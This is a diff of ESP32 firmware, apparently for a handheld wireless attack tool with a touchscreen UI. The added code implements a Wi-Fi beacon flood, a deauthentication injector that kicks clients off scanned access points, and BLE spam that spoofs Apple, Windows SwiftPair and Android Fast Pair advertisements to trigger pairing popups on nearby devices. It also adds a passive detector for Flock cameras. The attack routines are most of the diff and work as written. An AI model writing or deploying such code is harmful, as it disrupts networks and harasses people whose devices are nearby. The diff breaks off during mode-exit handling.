+  buf[11] = r1 & 0xFF; buf[12] = (r1 >> 8) & 0xFF; buf[13] = (r1 >> 16) & 0xFF;
+  buf[14] = r2 & 0xFF; buf[15] = (r2 >> 8) & 0xFF;
+  memcpy(buf + 16, buf + 10, 6);   // BSSID = SA
+  buf[22] = 0x00; buf[23] = 0x00;  // seq ctrl
+  memset(buf + 24, 0, 8);          // timestamp
+  buf[32] = 0x64; buf[33] = 0x00;  // beacon interval: 100 TUs
+  buf[34] = 0x31; buf[35] = 0x04;  // capability: ESS, short preamble, short slot
+  // SSID IE
+  uint8_t sl = (uint8_t)strlen(ssid); if (sl > 32) sl = 32;
+  buf[36] = 0x00; buf[37] = sl;
+  memcpy(buf + 38, ssid, sl);
+  int p = 38 + sl;
+  // Supported rates IE
+  static const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
+  memcpy(buf + p, rates, 10); p += 10;
+  // DS Parameter Set IE
+  buf[p++] = 0x03; buf[p++] = 0x01; buf[p++] = ch;
+  len = p;
+}
+
+static void bfUpdateDisplay() {
+  char tmp[20];
+  gfx->setTextSize(2);
+
+  // SENT value
+  gfx->fillRect(50, TITLE_H + 20, 130, 16, 0x0820);
+  gfx->setTextColor(COL_BEACON);
+  sprintf(tmp, "%lu", bfCount);
+  gfx->setCursor(50, TITLE_H + 20); gfx->print(tmp);
+
+  // CH value
+  gfx->fillRect(218, TITLE_H + 20, 50, 16, 0x0820);
+  gfx->setTextColor(0x07FF);
+  sprintf(tmp, "%d", bfChannel);
+  gfx->setCursor(218, TITLE_H + 20); gfx->print(tmp);
+
+  // RATE value
+  gfx->fillRect(330, TITLE_H + 20, 140, 16, 0x0820);
+  gfx->setTextColor(COL_GREEN);
+  sprintf(tmp, "%d/s", bfRate);
+  gfx->setCursor(330, TITLE_H + 20); gfx->print(tmp);
+
+  // SSID list (newest at top)
+  gfx->fillRect(0, BF_LIST_TOP, 480, 320 - BF_LIST_TOP, 0x0000);
+  for (int r = 0; r < BF_VISIBLE; r++) {
+    int idx = ((int)bfSsidHead - 1 - r + BF_SSID_LOG) % BF_SSID_LOG;
+    if (!bfSsidLog[idx][0]) continue;
+    int y = BF_LIST_TOP + r * BF_ROW_H;
+    gfx->fillRect(0, y, 480, BF_ROW_H, (r & 1) ? 0x0820 : 0x0000);
+    uint16_t col = (r == 0) ? COL_BEACON : (r < 3 ? (uint16_t)COL_LABEL : (uint16_t)COL_SECONDARY);
+    gfx->setTextSize(1);
+    gfx->setTextColor(col);
+    gfx->setCursor(8, y + (BF_ROW_H - 8) / 2);
+    gfx->print(bfSsidLog[idx]);
+  }
+}
+
+void drawBeaconFloodUI() {
+  gfx->fillScreen(0x0000);
+
+  // Title bar
+  drawBackButton();
+  gfx->setTextColor(COL_BEACON);
+  gfx->setTextSize(2);
+  const char *t = "BEACON FLOOD";
+  gfx->setCursor((480 - (int)strlen(t) * 12) / 2, (TITLE_H - 16) / 2);
+  gfx->print(t);
+  drawStatusDots();
+
+  // Stats bar
+  gfx->fillRect(0, TITLE_H, 480, BF_STATS_H, 0x0820);
+  gfx->drawFastHLine(0, TITLE_H + BF_STATS_H, 480, COL_DIVIDER);
+  gfx->setTextSize(1);
+  gfx->setTextColor(COL_LABEL);
+  gfx->setCursor(8,   TITLE_H + 6); gfx->print("SENT");
+  gfx->setCursor(200, TITLE_H + 6); gfx->print("CHANNEL");
+  gfx->setCursor(320, TITLE_H + 6); gfx->print("RATE");
+
+  // Initial stat values
+  gfx->setTextSize(2);
+  gfx->setTextColor(COL_BEACON);
+  gfx->setCursor(50, TITLE_H + 20); gfx->print("0");
+  gfx->setTextColor(0x07FF);
+  gfx->setCursor(218, TITLE_H + 20); gfx->print("1");
+  gfx->setTextColor(COL_GREEN);
+  gfx->setCursor(330, TITLE_H + 20); gfx->print("0/s");
+
+  // List area divider
+  gfx->drawFastHLine(0, BF_LIST_TOP - 1, 480, COL_DIVIDER);
+}
+
+void runBeaconFlood() {
+  char ssid[33];
+  bfMakeSSID(ssid);
+
+  uint8_t frame[90];
+  int len;
+  bfBuildFrame(frame, len, ssid, bfChannel);
+  esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
+
+  // Store in ring buffer
+  strncpy(bfSsidLog[bfSsidHead], ssid, 32);
+  bfSsidLog[bfSsidHead][32] = '\0';
+  bfSsidHead = (bfSsidHead + 1) % BF_SSID_LOG;
+
+  bfCount++;
+  bfRateCount++;
+  bfPerChannel++;
+
+  // Hop to next channel every BF_HOP_EVERY beacons
+  if (bfPerChannel >= BF_HOP_EVERY) {
+    bfPerChannel = 0;
+    bfChannel    = (bfChannel % 13) + 1;
+    esp_wifi_set_channel(bfChannel, WIFI_SECOND_CHAN_NONE);
+  }
+
+  unsigned long now = millis();
+  if (now - bfLastRateMs >= 1000) {
+    bfRate      = bfRateCount;
+    bfRateCount = 0;
+    bfLastRateMs = now;
+  }
+
+  if (now - bfLastDrawMs >= 200) {
+    bfLastDrawMs = now;
+    bfUpdateDisplay();
+  }
+}
+
+// ===========================================================================
+//  Shared "flood" UI — used by BT FLOOD, APPLE SPAM, DEAUTH
+//  Layout mirrors the beacon-flood screen: stats bar (SENT / mid / RATE)
+//  over a scrolling log of the most recent payloads/targets.
+// ===========================================================================
+static uint32_t      fdCount;
+static uint16_t      fdRate, fdRateCount;
+static unsigned long fdLastRateMs, fdLastDrawMs;
+static char          fdLog[BF_SSID_LOG][33];
+static uint8_t       fdHead;
+static uint16_t      fdAccent;
+static char          fdMidVal[20];
+
+static void floodReset(uint16_t accent) {
+  fdCount = 0; fdRate = 0; fdRateCount = 0;
+  fdLastRateMs = 0; fdLastDrawMs = 0; fdHead = 0;
+  memset(fdLog, 0, sizeof(fdLog));
+  fdAccent = accent; fdMidVal[0] = '\0';
+}
+
+static void floodLog(const char *s) {
+  strncpy(fdLog[fdHead], s, 32); fdLog[fdHead][32] = '\0';
+  fdHead = (fdHead + 1) % BF_SSID_LOG;
+}
+
+static void floodUpdateDisplay() {
+  char tmp[24];
+  // SENT
+  gfx->setTextSize(2);
+  gfx->fillRect(50, TITLE_H + 20, 130, 16, 0x0820);
+  gfx->setTextColor(fdAccent);
+  sprintf(tmp, "%lu", (unsigned long)fdCount);
+  gfx->setCursor(50, TITLE_H + 20); gfx->print(tmp);
+  // mid value (small text, may be a name)
+  gfx->fillRect(196, TITLE_H + 18, 118, 18, 0x0820);
+  gfx->setTextSize(1);
+  gfx->setTextColor(0xFFFF);
+  gfx->setCursor(196, TITLE_H + 24); gfx->print(fdMidVal);
+  // RATE
+  gfx->setTextSize(2);
+  gfx->fillRect(330, TITLE_H + 20, 150, 16, 0x0820);
+  gfx->setTextColor(COL_GREEN);
+  sprintf(tmp, "%d/s", fdRate);
+  gfx->setCursor(330, TITLE_H + 20); gfx->print(tmp);
+  // log list — fill each row's full-width rect directly (no global clear first)
+  // so the list refreshes in place instead of flashing black every redraw.
+  for (int r = 0; r < BF_VISIBLE; r++) {
+    int idx = ((int)fdHead - 1 - r + BF_SSID_LOG) % BF_SSID_LOG;
+    int y = BF_LIST_TOP + r * BF_ROW_H;
+    gfx->fillRect(0, y, 480, BF_ROW_H, (r & 1) ? 0x0820 : 0x0000);
+    if (!fdLog[idx][0]) continue;
+    uint16_t col = (r == 0) ? fdAccent : (r < 3 ? (uint16_t)COL_LABEL : (uint16_t)COL_SECONDARY);
+    gfx->setTextSize(1);
+    gfx->setTextColor(col);
+    gfx->setCursor(8, y + (BF_ROW_H - 8) / 2);
+    gfx->print(fdLog[idx]);
+  }
+}
+
+static void drawFloodUI(const char *title, uint16_t accent, const char *midCap) {
+  gfx->fillScreen(0x0000);
+  drawBackButton();
+  gfx->setTextColor(accent);
+  gfx->setTextSize(2);
+  gfx->setCursor((480 - (int)strlen(title) * 12) / 2, (TITLE_H - 16) / 2);
+  gfx->print(title);
+  drawStatusDots();
+  // Stats bar
+  gfx->fillRect(0, TITLE_H, 480, BF_STATS_H, 0x0820);
+  gfx->drawFastHLine(0, TITLE_H + BF_STATS_H, 480, COL_DIVIDER);
+  gfx->setTextSize(1);
+  gfx->setTextColor(COL_LABEL);
+  gfx->setCursor(8,   TITLE_H + 6); gfx->print("SENT");
+  gfx->setCursor(196, TITLE_H + 6); gfx->print(midCap);
+  gfx->setCursor(330, TITLE_H + 6); gfx->print("RATE");
+  gfx->drawFastHLine(0, BF_LIST_TOP - 1, 480, COL_DIVIDER);
+  floodUpdateDisplay();
+}
+
+static void floodTick() {
+  unsigned long now = millis();
+  if (now - fdLastRateMs >= 1000) { fdRate = fdRateCount; fdRateCount = 0; fdLastRateMs = now; }
+  if (now - fdLastDrawMs >= 200)  { fdLastDrawMs = now; floodUpdateDisplay(); }
+}
+
+// ===========================================================================
+//  BLE host + advertising — shared by BT FLOOD and APPLE SPAM
+//  Idempotent bring-up so it coexists with wardrive's BLE scanner (which uses
+//  the same controller and may have already initialised it this boot).
+// ===========================================================================
+static esp_ble_adv_params_t floodAdvParams = {
+  .adv_int_min       = 0x20,
+  .adv_int_max       = 0x40,
+  .adv_type          = ADV_TYPE_IND,
+  .own_addr_type     = BLE_ADDR_TYPE_RANDOM,
+  .peer_addr         = {0},
+  .peer_addr_type    = BLE_ADDR_TYPE_PUBLIC,
+  .channel_map       = ADV_CHNL_ALL,
+  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+};
+
+static void floodBleGapCb(esp_gap_ble_cb_event_t ev, esp_ble_gap_cb_param_t *p) {
+  // When new raw adv data is set, (re)start advertising it.
+  if (ev == ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT)
+    esp_ble_gap_start_advertising(&floodAdvParams);
+}
+
+static bool bleEnsureHost() {
+  if (esp_bt_controller_get_status() == ESP_BT_CONTROLLER_STATUS_IDLE) {
+    esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+    if (esp_bt_controller_init(&cfg) != ESP_OK) return false;
+  }
+  if (esp_bt_controller_get_status() != ESP_BT_CONTROLLER_STATUS_ENABLED) {
+    if (esp_bt_controller_enable(ESP_BT_MODE_BLE) != ESP_OK) return false;
+  }
+  if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_UNINITIALIZED) {
+    if (esp_bluedroid_init() != ESP_OK) return false;
+  }
+  if (esp_bluedroid_get_status() != ESP_BLUEDROID_STATUS_ENABLED) {
+    if (esp_bluedroid_enable() != ESP_OK) return false;
+  }
+  return true;
+}
+
+// Assign a fresh random static address (top two bits of MSB must be 1).
+static void floodSetRandAddr() {
+  esp_bd_addr_t a;
+  uint32_t r1 = esp_random(), r2 = esp_random();
+  a[0] = 0xC0 | (r1 & 0x3F);
+  a[1] = (r1 >> 8) & 0xFF; a[2] = (r1 >> 16) & 0xFF; a[3] = (r1 >> 24) & 0xFF;
+  a[4] = r2 & 0xFF;        a[5] = (r2 >> 8) & 0xFF;
+  esp_ble_gap_set_rand_addr(a);
+}
+
+// ---- Apple Continuity proximity-pairing model table ------------------------
+struct AppleModel { uint8_t hi, lo; const char *name; };
+static const AppleModel appleModels[] = {
+  {0x02, 0x20, "AirPods"},        {0x0e, 0x20, "AirPods Pro"},
+  {0x0a, 0x20, "AirPods Max"},    {0x0f, 0x20, "AirPods 2"},
+  {0x13, 0x20, "AirPods 3"},      {0x14, 0x20, "AirPods Pro 2"},
+  {0x0b, 0x20, "PowerBeats Pro"}, {0x12, 0x20, "Beats Fit Pro"},
+  {0x11, 0x20, "Beats Studio Buds"},
+};
+#define APPLE_MODELS 9
+
+// Build an Apple Continuity proximity-pairing advertisement (random model).
+// This is the frame iOS turns into a "Connect" pairing popup. d holds 31 bytes;
+// returns the model name for logging.
+static const char *buildAppleProximityPair(uint8_t *d) {
+  const AppleModel &m = appleModels[esp_random() % APPLE_MODELS];
+  uint8_t i = 0;
+  d[i++] = 0x1e;               // length (30 bytes follow)
+  d[i++] = 0xff;               // manufacturer specific
+  d[i++] = 0x4c; d[i++] = 0x00;// Apple company ID
+  d[i++] = 0x07;               // Continuity: proximity pairing
+  d[i++] = 0x19;               // payload length (25)
+  d[i++] = 0x07;               // prefix: new device (triggers Connect popup)
+  d[i++] = m.hi; d[i++] = m.lo;// device model
+  d[i++] = 0x55;               // status
+  while (i < 31) d[i++] = esp_random() & 0xFF;  // opaque/encrypted tail
+  return m.name;
+}
+
+// Microsoft SwiftPair — "Add a device?" toast on Windows. Returns adv length.
+static uint8_t buildSwiftPair(uint8_t *d, char *label) {
+  static const char *names[] = { "Surface", "Xbox", "Mouse", "Keyboard", "Speaker" };
+  char nm[16];
+  sprintf(nm, "%s-%03X", names[esp_random() % 5], (unsigned)(esp_random() & 0xFFF));
+  uint8_t nl = strlen(nm);
+  uint8_t i = 0;
+  d[i++] = 6 + nl;                                 // section length
+  d[i++] = 0xff; d[i++] = 0x06; d[i++] = 0x00;     // Microsoft company ID
+  d[i++] = 0x03; d[i++] = 0x00; d[i++] = 0x80;     // SwiftPair beacon (BLE pairing)
+  memcpy(d + i, nm, nl); i += nl;
+  snprintf(label, 33, "Win %s", nm);
+  return i;
+}
+
+// Google Fast Pair — half-sheet "device nearby" popup on Android. Returns len.
+static uint8_t buildFastPair(uint8_t *d, char *label) {
+  static const uint32_t models[] = {
+    0xCD8256, 0xF52494, 0x718FA4, 0x2D7A23, 0x0E2DD0, 0x92BBBD,
+  };
+  uint32_t id = models[esp_random() % 6];
+  uint8_t i = 0;
+  d[i++] = 0x03; d[i++] = 0x03; d[i++] = 0x2c; d[i++] = 0xfe;  // svc UUID 0xFE2C
+  d[i++] = 0x06; d[i++] = 0x16; d[i++] = 0x2c; d[i++] = 0xfe;  // service data hdr
+  d[i++] = (id >> 16) & 0xff; d[i++] = (id >> 8) & 0xff; d[i++] = id & 0xff;
+  snprintf(label, 33, "FastPair %06X", (unsigned)id);
+  return i;
+}
+
+// ---- BT FLOOD: cross-platform BLE device flood -----------------------------
+// Rotates through generic named LE devices (visible in BLE scanners / Android's
+// nearby-device list), Apple proximity-pair frames (iOS Connect popups),
+// SwiftPair (Windows) and Fast Pair (Android) so every nearby OS reacts —
+// previously iPhones saw nothing because a plain LE name is invisible to iOS.
+static const char *btFloodNames[] = {
+  "iPhone", "Galaxy", "JBL Flip", "Tile", "Mi Band",
+  "Pixel", "Echo Dot", "Buds", "Joy-Con", "Watch"
+};
+#define BT_FLOOD_NAMES 10
+#define BT_FLOOD_INTERVAL_MS 25
+
+void runBtFlood() {
+  static unsigned long last = 0;
+  unsigned long now = millis();
+  if (now - last < BT_FLOOD_INTERVAL_MS) { floodTick(); return; }
+  last = now;
+
+  esp_ble_gap_stop_advertising();
+  floodSetRandAddr();
+
+  uint8_t d[31]; uint8_t len; char label[33];
+  static uint8_t rr = 0;
+  switch (rr++ & 3) {
+    case 0: {  // generic named LE device
+      char name[22];
+      sprintf(name, "%s-%04X", btFloodNames[esp_random() % BT_FLOOD_NAMES],
+              (unsigned)(esp_random() & 0xFFFF));
+      uint8_t nl = strlen(name);
+      uint8_t i = 0;
+      d[i++] = 0x02; d[i++] = 0x01; d[i++] = 0x06;   // flags: LE general disc
+      d[i++] = nl + 1; d[i++] = 0x09;                 // complete local name
+      memcpy(d + i, name, nl); i += nl;
+      len = i; snprintf(label, sizeof label, "%s", name);
+      break;
+    }
+    case 1: {  // Apple proximity pairing — iOS popup
+      const char *nm = buildAppleProximityPair(d); len = 31;
+      snprintf(label, sizeof label, "iOS %s", nm);
+      break;
+    }
+    case 2:  len = buildSwiftPair(d, label); break;   // Windows popup
+    default: len = buildFastPair(d, label);  break;   // Android popup
+  }
+  esp_ble_gap_config_adv_data_raw(d, len);          // gap cb starts advertising
+
+  fdCount++; fdRateCount++;
+  snprintf(fdMidVal, sizeof fdMidVal, "%s", label);
+  static unsigned long lastLog = 0;
+  if (now - lastLog >= 100) { lastLog = now; floodLog(label); }
+  floodTick();
+}
+
+// ---- APPLE SPAM: Continuity proximity-pairing popups ------------------------
+#define APPLE_SPAM_INTERVAL_MS 20
+
+void runAppleSpam() {
+  static unsigned long last = 0;
+  unsigned long now = millis();
+  if (now - last < APPLE_SPAM_INTERVAL_MS) { floodTick(); return; }
+  last = now;
+
+  esp_ble_gap_stop_advertising();
+  floodSetRandAddr();
+
+  uint8_t d[31];
+  const char *nm = buildAppleProximityPair(d);
+  esp_ble_gap_config_adv_data_raw(d, 31);       // gap cb starts advertising
+
+  fdCount++; fdRateCount++;
+  snprintf(fdMidVal, sizeof fdMidVal, "%s", nm);
+  static unsigned long lastLog = 0;
+  if (now - lastLog >= 120) { lastLog = now; floodLog(nm); }
+  floodTick();
+}
+
+// ---- DEAUTH: 802.11 deauth injection against scanned APs --------------------
+struct DeauthTarget { uint8_t bssid[6]; uint8_t channel; char ssid[20]; };
+static DeauthTarget deauthTargets[16];
+static uint8_t      deauthCount = 0, deauthIdx = 0;
+static int8_t       deauthSel = -1;   // -1 = ALL (auto-hop); else locked target
+static unsigned long deauthHopMs = 0;
+
+// Stable target list: each visible row maps directly to deauthTargets[r], so a
+// tap can lock onto a specific AP. The active target is highlighted; a locked
+// target is marked ">". Redraws in place (no full clear) to avoid flicker.
+static void deauthDrawList() {
+  for (int r = 0; r < BF_VISIBLE; r++) {
+    int y = BF_LIST_TOP + r * BF_ROW_H;
+    if (r >= deauthCount) { gfx->fillRect(0, y, 480, BF_ROW_H, 0x0000); continue; }
+    bool locked = (deauthSel == r);
+    bool active = locked || (deauthSel < 0 && r == deauthIdx);
+    gfx->fillRect(0, y, 480, BF_ROW_H, active ? 0x2000 : ((r & 1) ? 0x0820 : 0x0000));
+    gfx->setTextSize(1);
+    gfx->setTextColor(locked ? COL_DEAUTH : (active ? 0xFFFF : (uint16_t)COL_SECONDARY));
+    gfx->setCursor(8, y + (BF_ROW_H - 8) / 2);
+    char line[48];
+    snprintf(line, sizeof line, "%c %s  ch%d",
+             locked ? '>' : ' ', deauthTargets[r].ssid, deauthTargets[r].channel);
+    gfx->print(line);
+  }
+}
+
+// Stats bar + selectable target list (DEAUTH's own display; mirrors floodTick).
+static void deauthUpdateDisplay() {
+  char tmp[24];
+  gfx->setTextSize(2);
+  gfx->fillRect(50, TITLE_H + 20, 130, 16, 0x0820);
+  gfx->setTextColor(fdAccent);
+  sprintf(tmp, "%lu", (unsigned long)fdCount);
+  gfx->setCursor(50, TITLE_H + 20); gfx->print(tmp);
+  gfx->fillRect(196, TITLE_H + 18, 118, 18, 0x0820);
+  gfx->setTextSize(1);
+  gfx->setTextColor(0xFFFF);
+  gfx->setCursor(196, TITLE_H + 24); gfx->print(fdMidVal);
+  gfx->setTextSize(2);
+  gfx->fillRect(330, TITLE_H + 20, 150, 16, 0x0820);
+  gfx->setTextColor(COL_GREEN);
+  sprintf(tmp, "%d/s", fdRate);
+  gfx->setCursor(330, TITLE_H + 20); gfx->print(tmp);
+  deauthDrawList();
+}
+
+static void deauthTick() {
+  unsigned long now = millis();
+  if (now - fdLastRateMs >= 1000) { fdRate = fdRateCount; fdRateCount = 0; fdLastRateMs = now; }
+  if (now - fdLastDrawMs >= 200)  { fdLastDrawMs = now; deauthUpdateDisplay(); }
+}
+
+static void deauthScan() {
+  deauthCount = 0;
+  wifi_scan_config_t sc = {};
+  sc.show_hidden = 1; sc.scan_type = WIFI_SCAN_TYPE_ACTIVE;
+  sc.scan_time.active.min = 80; sc.scan_time.active.max = 150;
+  esp_wifi_scan_start(&sc, true);  // blocking
+  uint16_t n = 0; esp_wifi_scan_get_ap_num(&n);
+  if (n > 16) n = 16;
+  wifi_ap_record_t *recs = (wifi_ap_record_t *)malloc(n * sizeof(wifi_ap_record_t));
+  if (recs) {
+    esp_wifi_scan_get_ap_records(&n, recs);
+    for (int i = 0; i < (int)n; i++) {
+      memcpy(deauthTargets[i].bssid, recs[i].bssid, 6);
+      deauthTargets[i].channel = recs[i].primary;
+      strncpy(deauthTargets[i].ssid, (char *)recs[i].ssid, 19);
+      deauthTargets[i].ssid[19] = '\0';
+      if (!deauthTargets[i].ssid[0]) strcpy(deauthTargets[i].ssid, "<hidden>");
+    }
+    deauthCount = n;
+    free(recs);
+  }
+}
+
+void runDeauth() {
+  unsigned long now = millis();
+  if (deauthCount == 0) { deauthTick(); return; }
+
+  uint8_t idx = (deauthSel >= 0) ? (uint8_t)deauthSel : deauthIdx;
+  DeauthTarget &t = deauthTargets[idx];
+  // Deauth frame: broadcast client, src/bssid = AP, reason 7 (class-3 frame).
+  uint8_t f[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  memcpy(f + 10, t.bssid, 6);
+  memcpy(f + 16, t.bssid, 6);
+  f[22] = 0x00; f[23] = 0x00; f[24] = 0x07; f[25] = 0x00;
+  for (int k = 0; k < 4; k++) {
+    esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);
+    fdCount++; fdRateCount++;
+  }
+
+  // Auto-hop across all APs only when no target is locked.
+  if (deauthSel < 0 && now - deauthHopMs >= 120) {
+    deauthHopMs = now;
+    deauthIdx = (deauthIdx + 1) % deauthCount;
+    DeauthTarget &nt = deauthTargets[deauthIdx];
+    esp_wifi_set_channel(nt.channel, WIFI_SECOND_CHAN_NONE);
+    snprintf(fdMidVal, sizeof fdMidVal, "ALL: %s", nt.ssid);
+  }
+  deauthTick();
+}
+
+// ---------------------------------------------------------------------------
+// Flock detector — passive 2.4 GHz wildcard-probe fingerprint scanner
+// ---------------------------------------------------------------------------
+// Known Flock infrastructure OUIs from the public Flock-You research dataset.
+static const uint8_t flockOuis[][3] = {
+  {0x70,0xc9,0x4e}, {0x3c,0x91,0x80}, {0xd8,0xf3,0xbc}, {0x80,0x30,0x49},
+  {0xb8,0x35,0x32}, {0x14,0x5a,0xfc}, {0x74,0x4c,0xa1}, {0x08,0x3a,0x88},
+  {0x9c,0x2f,0x9d}, {0xc0,0x35,0x32}, {0x94,0x08,0x53}, {0xe4,0xaa,0xea},
+  {0xf4,0x6a,0xdd}, {0xf8,0xa2,0xd6}, {0x24,0xb2,0xb9}, {0x00,0xf4,0x8d},
+  {0xd0,0x39,0x57}, {0xe8,0xd0,0xfc}, {0xe0,0x4f,0x43}, {0xb8,0x1e,0xa4},
+  {0x70,0x08,0x94}, {0x58,0x8e,0x81}, {0xec,0x1b,0xbd}, {0x3c,0x71,0xbf},
+  {0x58,0x00,0xe3}, {0x90,0x35,0xea}, {0x5c,0x93,0xa2}, {0x64,0x6e,0x69},
+  {0x48,0x27,0xea}, {0xa4,0xcf,0x12}, {0x82,0x6b,0xf2}
+};
+
+struct __attribute__((packed)) FlockWifiHeader {
+  uint16_t frameControl, duration;
+  uint8_t addr1[6], addr2[6], addr3[6];
+  uint16_t sequence;
+};
+
+struct FlockRxEvent {
+  uint8_t mac[6];
+  int8_t rssi;
+  uint8_t channel;
+};
+
+static portMUX_TYPE flockMux = portMUX_INITIALIZER_UNLOCKED;
+static volatile bool flockEventPending = false;
+static FlockRxEvent flockRxEvent = {};
+static uint8_t flockChannel = 11;
+static uint8_t flockHopIndex = 0;
+static unsigned long flockHopMs = 0;
+static uint32_t flockHitCount = 0;
+static uint8_t flockSeenMacs[12][6] = {};
+static uint8_t flockSeenCount = 0;
+static char flockLastMac[18] = "--:--:--:--:--:--";
+static int8_t flockLastRssi = -127;
+static uint8_t flockLastChannel = 0;
+
+static bool flockOuiMatch(const uint8_t *mac) {
+  for (size_t i = 0; i < sizeof(flockOuis) / sizeof(flockOuis[0]); i++) {
+    if (!memcmp(mac, flockOuis[i], 3)) return true;
+  }
+  return false;
+}
+
+// Match the drive-tested Flock probe IE order:
+// 2,12,127,221:506f9a16030103,45,191,221:0050f208000000.
+static bool flockProbeFingerprint(const uint8_t *body, int len) {
+  static const uint8_t expectedTags[] = {2, 12, 127, 221, 45, 191, 221};
+  static const uint8_t vendorA[] = {0x50,0x6f,0x9a,0x16,0x03,0x01,0x03};
+  static const uint8_t vendorB[] = {0x00,0x50,0xf2,0x08,0x00,0x00,0x00};
+  int pos = 0;
+  size_t expected = 0;
+  bool wildcardSsid = false;
+
+  while (pos + 2 <= len) {
+    uint8_t tag = body[pos];
+    uint8_t size = body[pos + 1];
+    if (pos + 2 + size > len) break;  // usually the trailing four-byte FCS
+    const uint8_t *value = body + pos + 2;
+    pos += 2 + size;
+
+    if (tag == 0) {
+      if (size != 0) return false;
+      wildcardSsid = true;
+      continue;
+    }
+    if (expected >= sizeof(expectedTags) || tag != expectedTags[expected]) return false;
+    if (tag == 221) {
+      const uint8_t *vendor = (expected == 3) ? vendorA : vendorB;
+      if (size < 7 || memcmp(value, vendor, 7)) return false;
+    }
+    expected++;
+  }
+  return wildcardSsid && expected == sizeof(expectedTags) && len - pos <= 4;
+}
+
+static void flockPromiscuousCallback(void *buffer, wifi_promiscuous_pkt_type_t type) {
+  if (!buffer || type != WIFI_PKT_MGMT || currentMode != FLOCK_DETECTOR) return;
+  wifi_promiscuous_pkt_t *packet = static_cast<wifi_promiscuous_pkt_t *>(buffer);
+  if (packet->rx_ctrl.sig_len < sizeof(FlockWifiHeader) + 2) return;
+  FlockWifiHeader *header = reinterpret_cast<FlockWifiHeader *>(packet->payload);
+  uint8_t fc0 = packet->payload[0];
+  if ((fc0 & 0xfc) != 0x40 || !flockOuiMatch(header->addr2)) return; // probe request
+
+  const uint8_t *body = packet->payload + sizeof(FlockWifiHeader);
+  int bodyLen = (int)packet->rx_ctrl.sig_len - (int)sizeof(FlockWifiHeader);
+  if (!flockProbeFingerprint(body, bodyLen) &&
+      (bodyLen <= 4 || !flockProbeFingerprint(body, bodyLen - 4))) return;
+
+  portENTER_CRITICAL(&flockMux);
+  memcpy(flockRxEvent.mac, header->addr2, 6);
+  flockRxEvent.rssi = packet->rx_ctrl.rssi;
+  flockRxEvent.channel = packet->rx_ctrl.channel;
+  flockEventPending = true;
+  portEXIT_CRITICAL(&flockMux);
+}
+
+void drawFlockDetectorUI() {
+  gfx->fillScreen(COL_BG);
+  drawBackButton();
+  gfx->setTextColor(COL_FLOCK); gfx->setTextSize(2);
+  gfx->setCursor(118, 12); gfx->print("FLOCK DETECTOR");
+
+  gfx->drawRect(18, 56, 444, 82, COL_FLOCK);
+  gfx->setTextColor(COL_GREEN); gfx->setTextSize(3);
+  gfx->setCursor(150, 78); gfx->print("SCANNING");
+
+  gfx->setTextColor(COL_LABEL); gfx->setTextSize(2);
+  gfx->setCursor(28, 158); gfx->print("Unique devices:");
+  gfx->setCursor(28, 190); gfx->print("Probe hits:");
+  gfx->setCursor(28, 222); gfx->print("Channel:");
+  gfx->setCursor(28, 254); gfx->print("Last signal:");
+  gfx->setTextSize(1); gfx->setTextColor(COL_SECONDARY);
+  gfx->setCursor(28, 307); gfx->print("Passive scan - candidate detections require visual confirmation");
+}
+
+static void flockDrawValues() {
+  gfx->fillRect(220, 150, 245, 86, COL_BG);
+  gfx->fillRect(180, 246, 285, 54, COL_BG);
+  gfx->setTextColor(COL_TITLE); gfx->setTextSize(2);
+  gfx->setCursor(245, 158); gfx->printf("%u", flockSeenCount);
+  gfx->setCursor(245, 190); gfx->printf("%lu", (unsigned long)flockHitCount);
+  gfx->setCursor(245, 222); gfx->printf("%u", flockChannel);
+  if (flockLastChannel) {
+    gfx->setCursor(190, 254); gfx->printf("%d dBm  ch %u", flockLastRssi, flockLastChannel);
+    gfx->setTextSize(1); gfx->setTextColor(COL_FLOCK);
+    gfx->setCursor(190, 280); gfx->print(flockLastMac);
+  } else {
+    gfx->setCursor(190, 254); gfx->print("none");
+  }
+}
+
+void runFlockDetector() {
+  static const uint8_t channels[] = {11, 6, 1};
+  unsigned long now = millis();
+  if (now - flockHopMs >= 250) {
+    flockHopMs = now;
+    flockHopIndex = (flockHopIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
+    flockChannel = channels[flockHopIndex];
+    esp_wifi_set_channel(flockChannel, WIFI_SECOND_CHAN_NONE);
+    flockDrawValues();
+  }
+
+  FlockRxEvent event;
+  bool haveEvent = false;
+  portENTER_CRITICAL(&flockMux);
+  if (flockEventPending) {
+    event = flockRxEvent;
+    flockEventPending = false;
+    haveEvent = true;
+  }
+  portEXIT_CRITICAL(&flockMux);
+  if (!haveEvent) return;
+
+  flockHitCount++;
+  bool known = false;
+  for (uint8_t i = 0; i < flockSeenCount; i++) {
+    if (!memcmp(flockSeenMacs[i], event.mac, 6)) { known = true; break; }
+  }
+  if (!known && flockSeenCount < 12) memcpy(flockSeenMacs[flockSeenCount++], event.mac, 6);
+  snprintf(flockLastMac, sizeof(flockLastMac), "%02X:%02X:%02X:%02X:%02X:%02X",
+           event.mac[0], event.mac[1], event.mac[2], event.mac[3], event.mac[4], event.mac[5]);
+  flockLastRssi = event.rssi;
+  flockLastChannel = event.channel;
+  gfx->fillRect(19, 57, 442, 80, COL_BG);
+  gfx->setTextColor(COL_FLOCK); gfx->setTextSize(3);
+  gfx->setCursor(142, 78); gfx->print("DETECTED!");
+  flockDrawValues();
+  Serial.printf("FLOCK candidate %s RSSI %d ch %u\n", flockLastMac, flockLastRssi, flockLastChannel);
+}
+
 // ---------------------------------------------------------------------------
 // Mode control
 // ---------------------------------------------------------------------------
@@ -1204,6 +2389,134 @@ void activateMode(Mode mode) {
     return;
   }
 
+  // Exiting BEACON_FLOOD
+  if (currentMode == BEACON_FLOOD && mode != BEACON_FLOOD) {
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    currentMode = mode;
+    drawUI();
+    return;
+  }
+
+  // Exiting BT_FLOOD / APPLE_SPAM — stop advertising (keep BLE host inited)
+  if ((currentMode == BT_FLOOD || currentMode == APPLE_SPAM) && mode != currentMode) {
+    esp_ble_gap_stop_advertising();
